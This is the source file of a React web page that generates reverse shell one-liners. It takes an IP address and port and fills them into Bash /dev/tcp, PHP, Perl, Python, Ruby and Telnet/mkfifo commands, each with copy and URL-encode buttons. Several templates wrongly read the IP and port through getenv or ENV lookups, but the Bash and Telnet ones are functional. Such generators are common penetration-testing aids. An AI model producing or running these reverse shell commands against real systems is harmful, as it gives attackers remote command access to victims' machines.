import React, { useState } from "react";
import { Button, message, Typography, Row, Col, Divider } from "antd";
import { CopyOutlined, WifiOutlined, LinkOutlined } from "@ant-design/icons";
import MaskedInput from "antd-mask-input";
import QueueAnim from "rc-queue-anim";
import Clipboard from "react-clipboard.js";

const { Title, Paragraph } = Typography;

export default (props) => {
  const [values, setValues] = useState({
    ip: "",
    port: "",
  });
  const handleChange = (name) => (event) => {
    setValues({ ...values, [name]: event.target.value });
  };
  const successInfoReverseShell = () => {
    message.success("Your reverse shell has been copied");
  };
  const successInfoEncodeURL = () => {
    message.success("Reverse shell URI encoded has been copied");
  };
  const bash_rshell = `bash -c 'exec bash -i &>/dev/tcp/${values.ip}/${values.port} <&1'`;
  const php_rshell = `php -r '$sock=fsockopen(getenv("${values.ip}"),getenv("${values.port}"));exec("/bin/sh -i <&3 >&3 2>&3");'`;
  const perl_rshell = `perl -e 'use Socket;$i="$ENV{${values.ip}}";$p=$ENV{${values.port}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
  const python_rshell = `python -c 'import sys,socket,os,pty;s=socket.socket()
  s.connect((os.getenv("${values.ip}"),int(os.getenv("${values.port}"))))
  [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
  pty.spawn("/bin/sh")'`;
  const ruby_rshell = `ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["${values.ip}"],ENV["${values.port}"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`;
  const telnet_rshell = `TF=$(mktemp -u);
  mkfifo $TF && telnet ${values.ip} ${values.port} 0<$TF | /bin/sh 1>$TF
  `;
  return (
    <QueueAnim delay={300} duration={1000}>
      <Title
        variant='Title level={3}'
        style={{ fontWeight: "bold", margin: 15 }}
      >
        Reverse shell
      </Title>
      <Paragraph style={{ margin: 15 }}>Reverse shell generator</Paragraph>
      <div style={{ padding: 15 }}>
        <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
          <Col span={12}>
            <MaskedInput
              prefix={<WifiOutlined />}
              mask='111.111.111.111'
              name='Ip adress'
              placeholderChar=' '
              placeholder='IP Address (ex: 212.212.111.222)'
              onChange={handleChange("ip")}
            />
          </Col>
          <Col span={12}>
            <MaskedInput
              placeholderChar=' '
              prefix={
                <svg
                  t='1592848067245'
                  class='iconfont'
                  viewBox='0 0 1024 1024'
                  version='1.1'
                  xmlns='http://www.w3.org/2000/svg'
                  p-id='5009'
                  width='15'
                  height='15'
                >
                  <path
                    d='M170.666667 640H106.666667a21.333333 21.333333 0 0 1-21.333334-21.333333v-426.666667a21.333333 21.333333 0 0 1 21.333334-21.333333h768a21.333333 21.333333 0 0 1 21.333333 21.333333v426.666667a21.333333 21.333333 0 0 1-21.333333 21.333333H810.666667v64a21.333333 21.333333 0 0 1-21.333334 21.333333H725.333333v64a21.333333 21.333333 0 0 1-21.333333 21.333334h-426.666667a21.333333 21.333333 0 0 1-21.333333-21.333334V725.333333H192a21.333333 21.333333 0 0 1-21.333333-21.333333V640zM128 213.333333v384h64a21.333333 21.333333 0 0 1 21.333333 21.333334V682.666667h64a21.333333 21.333333 0 0 1 21.333334 21.333333V768h384v-64a21.333333 21.333333 0 0 1 21.333333-21.333333H768v-64a21.333333 21.333333 0 0 1 21.333333-21.333334H853.333333V213.333333H128z m469.333333 64a21.333333 21.333333 0 1 1 42.666667 0v85.333334a21.333333 21.333333 0 1 1-42.666667 0v-85.333334z m85.333334 0a21.333333 21.333333 0 1 1 42.666666 0v85.333334a21.333333 21.333333 0 1 1-42.666666 0v-85.333334z m-170.666667 0a21.333333 21.333333 0 1 1 42.666667 0v85.333334a21.333333 21.333333 0 1 1-42.666667 0v-85.333334z m-85.333333 0a21.333333 21.333333 0 1 1 42.666666 0v85.333334a21.333333 21.333333 0 1 1-42.666666 0v-85.333334z m-85.333334 0a21.333333 21.333333 0 0 1 42.666667 0v85.333334a21.333333 21.333333 0 0 1-42.666667 0v-85.333334z m-85.333333 0a21.333333 21.333333 0 0 1 42.666667 0v85.333334a21.333333 21.333333 0 0 1-42.666667 0v-85.333334z'
                    fill='#000000'
                    p-id='5010'
                  />
                </svg>
              }
              mask='1111'
              name='Port'
              placeholder='Port (ex: 1337)'
              onChange={handleChange("port")}
            />
          </Col>
        </Row>
      </div>
      <Divider dashed />
      <div style={{ padding: 10, marginTop: 15 }} key='a'>
        <Title level={3}>
          Bash{" "}
          <svg
            t='1592850739876'
            className='iconfont'
            viewBox='0 0 1024 1024'
            version='1.1'
            xmlns='http://www.w3.org/2000/svg'
            p-id='2133'
            width='15'
            height='15'
          >
            <path
              d='M897.593538 209.051598L574.331507 17.150764a122.017871 122.017871 0 0 0-124.705678 0.042663L126.363798 209.051598A128.972037 128.972037 0 0 0 64.032291 320.104926v383.759004c0 45.778034 23.76362 88.14298 62.374171 111.053328l323.262031 191.85817a122.017871 122.017871 0 0 0 124.663014 0l323.262031-191.85817a128.972037 128.972037 0 0 0 62.374171-111.053328V320.104926A128.886709 128.886709 0 0 0 897.593538 209.051598zM647.243585 808.304401l0.554626 27.56068c0.042664 3.32776-2.13318 7.12482-4.735658 8.447391l-16.340156 9.385991c-2.602479 1.322571-4.735659-0.298645-4.778322-3.626406l-0.298645-27.09138c-13.993658 5.802248-28.15797 7.210147-37.202652 3.583741-1.706544-0.682617-2.431825-3.199769-1.749207-6.058229l5.930239-24.915538a10.239262 10.239262 0 0 1 2.943788-5.162294 6.954165 6.954165 0 0 1 1.535889-1.109254c0.938599-0.4693 1.834534-0.59729 2.645143-0.255981 9.769962 3.285097 22.227731 1.749207 34.2162-4.309023 15.230902-7.72211 25.4275-23.251657 25.256846-38.695877-0.127991-13.993658-7.72211-19.83857-26.152781-19.966561-23.464975 0.042664-45.394061-4.565004-45.73537-39.122513-0.298645-28.456615 14.505621-58.065148 37.927932-76.794465l-0.298645-27.816661c-0.042664-3.413087 2.047852-7.167483 4.735659-8.532719l15.785529-10.068607c2.602479-1.322571 4.735659 0.298645 4.778322 3.711732l0.255981 27.859325c11.64716-4.650331 21.801095-5.887576 30.973768-3.754396 2.005189 0.511963 2.858461 3.242433 2.047852 6.442203l-6.143557 24.659556a10.879216 10.879216 0 0 1-2.773133 4.948976 6.868838 6.868838 0 0 1-1.621217 1.194581 3.541078 3.541078 0 0 1-2.431825 0.383972c-4.181032-0.938599-14.164312-3.114442-29.82185 4.820986-16.425483 8.3194-22.185067 22.611703-22.057077 33.192274 0.127991 12.671087 6.612857 16.51081 29.053906 16.894782 29.864514 0.511963 42.791582 13.567022 43.090227 43.644854 0.298645 29.395214-15.44422 61.136926-39.591812 80.54886z m169.502448-46.375323c0 2.559815-0.341309 4.948977-2.474488 6.18622l-81.743441 49.660421c-2.13318 1.237244-3.839723 0.170654-3.839724-2.389161v-21.075815c0-2.559815 1.578553-3.967714 3.711733-5.204958l80.506197-48.167194c2.13318-1.237244 3.839723-0.170654 3.839723 2.389161v18.601326z m56.145286-471.944648l-305.812623 188.871719c-38.141251 22.313058-66.256557 47.313923-66.256557 93.305274v376.847503c0 27.518016 11.092534 45.351398 28.15797 50.513692a98.296914 98.296914 0 0 1-16.980109 1.66388c-17.918708 0-35.538772-4.863649-51.068319-14.078985L137.66965 795.249342a106.402997 106.402997 0 0 1-51.238974-91.385412V320.104926c0-37.586624 19.625252-72.613432 51.238974-91.385413L460.931681 36.818679a99.918131 99.918131 0 0 1 102.136638 0l323.262031 191.900834a105.763043 105.763043 0 0 1 49.660421 73.89334c-10.751225-22.867685-34.898818-29.096569-63.099452-12.628423z'
              p-id='2134'
            />
          </svg>
        </Title>
        <Paragraph copyable ellipsis={true}>
          {bash_rshell}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={bash_rshell}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined /> Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(bash_rshell)}>
          <Button
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div
        key='b'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title level={3}>
          PHP{" "}
          <svg
            t='1592847880798'
            className='iconfont'
            viewBox='0 0 1280 1024'
            version='1.1'
            xmlns='http://www.w3.org/2000/svg'
            p-id='1703'
            width='20'
            height='20'
          >
            <path
              d='M640 209c342.8 0 606.4 144.4 606.4 303S982.6 815 640 815c-342.8 0-606.4-144.4-606.4-303S297.4 209 640 209m0-33.6C286.6 175.4 0 326 0 512s286.6 336.6 640 336.6S1280 698 1280 512 993.4 175.4 640 175.4zM436.4 485c-15.8 81-71.6 72.6-140.2 72.6l27.4-141.2c76 0 127.6-8.2 112.8 68.6zM194.8 700.6h73.4l17.4-89.6c82.2 0 133.2 6 180.4-38.2 52.2-48 65.8-133.4 28.6-176.2-19.4-22.4-50.6-33.4-93-33.4h-141.4L194.8 700.6z m371.4-427.2h73l-17.4 89.6c63 0 121.4-4.6 149.6 21.4 29.6 27.2 15.4 62-16.6 226.2h-74c30.8-158.8 36.6-172 25.4-184-10.8-11.6-35.4-9.2-94.8-9.2l-37.6 193.2h-73l65.4-337.2zM1010 485c-16 82.2-73.4 72.6-140.2 72.6l27.4-141.2c76.4 0 127.6-8.2 112.8 68.6zM768.4 700.6H842l17.4-89.6c86.4 0 134.2 5 180.4-38.2 52.2-48 65.8-133.4 28.6-176.2-19.4-22.4-50.6-33.4-93-33.4H834l-65.6 337.4z'
              p-id='1704'
            />
          </svg>
        </Title>
        <Paragraph copyable ellipsis={true}>
          {php_rshell}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={php_rshell}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined />
            Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(php_rshell)}>
          <Button
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div
        key='c'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title level={3}>
          Perl
          <svg
            t='1592847933683'
            className='iconfont'
            viewBox='0 0 1024 1024'
            version='1.1'
            xmlns='http://www.w3.org/2000/svg'
            p-id='2135'
            width='20'
            height='20'
          >
            <path
              d='M533.333333 597.333333c-42.666667 0-128 42.666667-128 85.333334 0 85.333333 128 85.333333 128 85.333333v-42.666667a42.666667 42.666667 0 0 1-42.666666-42.666666 42.666667 42.666667 0 0 1 42.666666-42.666667v-42.666667m0 213.333334s-170.666667-21.333333-170.666666-106.666667c0-128 128-160 170.666666-160V490.666667c-42.666667 0-213.333333 64-213.333333 192 0 170.666667 213.333333 170.666667 213.333333 170.666666v-42.666666M450.986667 299.946667l50.773333 22.613333c18.346667-104.106667 67.413333-173.226667 67.413333-173.226667-18.346667 43.946667-30.293333 80.213333-37.973333 108.8C582.826667 151.466667 687.36 85.333333 687.36 85.333333a679.082667 679.082667 0 0 0-112.64 150.613334c67.413333-71.68 160.853333-118.613333 160.853333-118.613334-114.773333 73.386667-166.4 189.866667-179.2 222.293334l23.466667 3.413333c0 22.186667 0 42.666667 10.666667 58.88 32.426667 80.64 198.826667 87.466667 198.826666 280.746667s-171.946667 256-263.253333 256-291.413333-41.386667-291.413333-256 211.2-216.32 248.746666-302.08c5.12-16.213333-32.426667-80.64-32.426666-80.64z'
              fill='#515151'
              p-id='2136'
            />
          </svg>
        </Title>
        <Paragraph copyable ellipsis={true}>
          {perl_rshell}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={perl_rshell}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined />
            Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(perl_rshell)}>
          <Button
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div
        key='d'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title level={3}>
          Python{" "}
          <svg
            t='1592847699034'
            className='iconfont'
            viewBox='0 0 1024 1024'
            version='1.1'
            xmlns='http://www.w3.org/2000/svg'
            p-id='956'
            width='20'
            height='20'
          >
            <path
              d='M943.58718 401c-15.4-61.8-44.6-108.4-106.8-108.4h-80.2v94.8c0 73.6-62.4 135.6-133.6 135.6H409.38718c-58.4 0-106.8 50-106.8 108.6v203.6c0 58 50.4 92 106.8 108.6 67.6 19.8 132.6 23.4 213.6 0 53.8-15.6 106.8-47 106.8-108.6v-81.4H516.38718v-27.2h320.4c62.2 0 85.2-43.4 106.8-108.4 22.4-67 21.4-131.4 0-217.2zM636.38718 808c22.2 0 40.2 18.2 40.2 40.6 0 22.6-18 40.8-40.2 40.8-22 0-40.2-18.4-40.2-40.8 0.2-22.6 18.2-40.6 40.2-40.6zM399.58718 496.2h213.6c59.4 0 106.8-49 106.8-108.6V183.8c0-58-48.8-101.4-106.8-111.2-71.6-11.8-149.4-11.2-213.6 0.2-90.4 16-106.8 49.4-106.8 111.2v81.4h213.8v27.2h-294c-62.2 0-116.6 37.4-133.6 108.4-19.6 81.4-20.4 132.2 0 217.2 15.2 63.2 51.4 108.4 113.6 108.4H265.98718v-97.6c0-70.6 61-132.8 133.6-132.8z m-13.4-285.2c-22.2 0-40.2-18.2-40.2-40.6 0.2-22.6 18-40.8 40.2-40.8 22 0 40.2 18.4 40.2 40.8s-18 40.6-40.2 40.6z'
              p-id='957'
            />
          </svg>
        </Title>
        <Paragraph copyable ellipsis={true}>
          {" "}
          {python_rshell}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={python_rshell}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined />
            Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(python_rshell)}>
          <Button
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div
        key='e'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title level={3}>
          Ruby{" "}
          <svg
            t='1592847961656'
            className='iconfont'
            viewBox='0 0 1024 1024'
            version='1.1'
            xmlns='http://www.w3.org/2000/svg'
            p-id='2443'
            width='20'
            height='20'
          >
            <path
              d='M859.989333 3.541333c129.408 22.4 166.101333 110.848 163.370667 203.52L1024 205.738667 965.76 968.96 208.64 1020.842667h0.682667C146.474667 1018.197333 6.4 1012.437333 0 816.597333l70.186667-128 120.277333 281.002667 21.461333 50.005333 119.68-390.144-1.28 0.298667 0.682667-1.28 394.88 126.122667-59.562667-231.722667-42.24-166.4 376.32-24.277333-26.24-21.76L704 90.197333 860.117333 3.114667l-0.128 0.426666zM0 814.464v1.109333-1.237333 0.128zM218.88 216.448c151.936-150.741333 348.032-239.829333 423.338667-163.84 75.178667 75.818667-4.48 260.48-156.714667 411.136-152.021333 150.698667-345.728 244.650667-420.864 168.832-75.349333-75.818667 1.92-265.258667 154.112-416l0.128-0.128z'
              fill=''
              p-id='2444'
            />
          </svg>
        </Title>
        <Paragraph copyable ellipsis={true}>
          {ruby_rshell}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={ruby_rshell}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined />
            Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(ruby_rshell)}>
          <Button
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div style={{ padding: 15, marginTop: 15 }} key='f'>
        <Title level={3}>
          Telnet{" "}
          <svg
            t='1592848003310'
            className='iconfont'
            viewBox='0 0 1024 1024'
            version='1.1'
            xmlns='http://www.w3.org/2000/svg'
            p-id='2581'
            width='20'
            height='20'
          >
            <path
              d='M826.24628022 53.24171909H199.32480976C113.57628848 53.24171909 43.81517907 123.00282849 43.81517907 208.75134978v430.533649c0 85.75009236 69.76110941 155.51120178 155.50963069 155.51120179H411.4502398v76.98341013H236.53450541c-16.48387632 0-29.85071007 23.1170183-29.85071008 51.06042512 0 27.94183572 13.36683376 51.0604251 29.85071008 51.06042509h553.02525218c16.48544739 0 29.85071007-23.1185894 29.85071006-51.06042509 0-27.94340679-13.36526265-51.0604251-29.85071006-51.06042512H614.1208502v-76.98341013h212.12543002C911.99480153 794.79620057 981.75591092 725.03509116 981.75591092 639.28656987V208.75134978C981.75591092 123.00282849 911.99480153 53.24171909 826.24628022 53.24171909zM887.49051073 639.28656987C887.49051073 673.05714948 860.01685986 700.53080036 826.24628022 700.53080036H199.32480976C165.55423013 700.53080036 138.08057926 673.05714948 138.08057926 639.28656987V208.75134978C138.08057926 174.98077014 165.55423013 147.50711927 199.32480976 147.50711927h626.91989939C860.01685986 147.50711927 887.49051073 174.98077014 887.49051073 208.75134978v430.53522009z'
              p-id='2582'
            />
            <path
              d='M274.76540951 252.77014948h474.46918098v344.06871069H274.76540951z'
              p-id='2583'
            />
          </svg>
        </Title>
        <Paragraph copyable ellipsis={true}>
          {telnet_rshell}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={telnet_rshell}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined />
            Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(telnet_rshell)}>
          <Button
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
    </QueueAnim>
  );
};
